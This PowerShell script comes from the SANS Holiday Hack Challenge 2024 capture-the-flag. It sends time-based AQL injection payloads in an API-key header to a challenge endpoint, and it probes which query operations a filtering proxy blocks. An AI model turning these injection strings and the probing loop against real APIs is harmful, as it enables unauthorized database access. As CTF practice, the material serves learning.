<#
    .SYNOPSIS

        Holiday Hack Challenge 2024 - Snow-maggedon
        
        Deactivate Frostbit Naughty-Nice List Publication
        Difficulty: 5 of 5

        Author: Nick DeBaggis
        License: BSD 3-Clause
        Required Dependencies: Powershell 7
        Optional Dependencies: None

    .DESCRIPTION

        This script tests the ArangoDB SLEEP() operation to help determine a good range of timings for
        the deactivation attack.  The script also attempts to execute all the AQL operations listed
        in the flat file sql-op-list.txt loaded from the same directory as the script, outputting two
        lists containing which operations are blocked or available for use as injections.
        
    .PARAMETER BotUUID

        Required Bot UUID, this is unique to each player and set of generated artifacts.
        You can find this UUID in both the frostbit_core_dump file strings as well as the
        pcap file provided you have decrypted the TLS HTTP traffic stream.
        
        The BotUUID will have this format of hex chars and dashes (example only):
        f14d60cd-67b9-44ec-8f41-b5ea5137413c

    .EXAMPLE

        .\15-frostbit-deactivate-sql-timing-ops-test.ps1 -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c

    .LINK
        https://www.sans.org/mlp/holiday-hack-challenge-2024/


#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [String]$BotUUID
)

function Is-UUID {
    param (
        [string]$InputString
    )
    
    $uuidRegex = '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}$'
    return $InputString -match $uuidRegex
}
if(-not (Is-UUID -InputString $BotUUID)){
    "Error badly formatted BotUUID, you can find yours in the decrypted TLS HTTP pcap data and the frostbit_core_dump file."
    return
}

$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0"

$apikey = " `' OR 1==1"
"Timing sql inject known to NOT work: "
"X-API-Key:" + $apikey

$sw = [Diagnostics.Stopwatch]::StartNew()

Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
-WebSession $session `
-SkipHttpErrorCheck `
-Headers @{
"X-API-Key"="$apikey"
} | Out-Null
$sw.Stop()
$sw.Elapsed | Select TotalMilliseconds | fl

"Timing sql inject likely to work: "
# loop through sleep timings from 0.2 thru 3.0, stepping by 0.2
1..15 | % {
    $step = $_ * 2 / 10
    $apikey = " `' OR 1==1 ? SLEEP($step) : `'"
    "X-API-Key:" + $apikey
    
    $sw = [Diagnostics.Stopwatch]::StartNew()

    Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
    -WebSession $session `
    -SkipHttpErrorCheck `
    -Headers @{
    "X-API-Key"="$apikey"
    } | Out-Null
    $sw.Stop()
    $sw.Elapsed | Select TotalMilliseconds | fl
}

if(-not (Test-Path -Path sql-op-list.txt)){
    "sql-op-list.txt file not found, skipping checks for blocked and available sql operations!"
    return
}
else{
    "Checking sql operations for proxy filtering: "
    $ops = Get-Content -Path sql-op-list.txt
    $output = $(foreach($op in $ops) {
        
        $apikey = " `' OR $op `'"
    
        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
        -WebSession $session `
        -SkipHttpErrorCheck `
        -Headers @{
        "X-API-Key"="$apikey"
        }).Content | ConvertFrom-Json
        if($resp.error -Match "Timeout or error in query"){
            "X-API-Key:" + $apikey + " : " + $resp.error.Substring(0,25)
        }
        else{
            "X-API-Key:" + $apikey + " : " + $resp.error
        }
    })
    
    "Blocked SQL operations:"
    $output | Select-String -Pattern "Blocked"
    "`nAvailable SQL operations:"
    $output | Select-String -Pattern "Blocked" -NotMatch
}
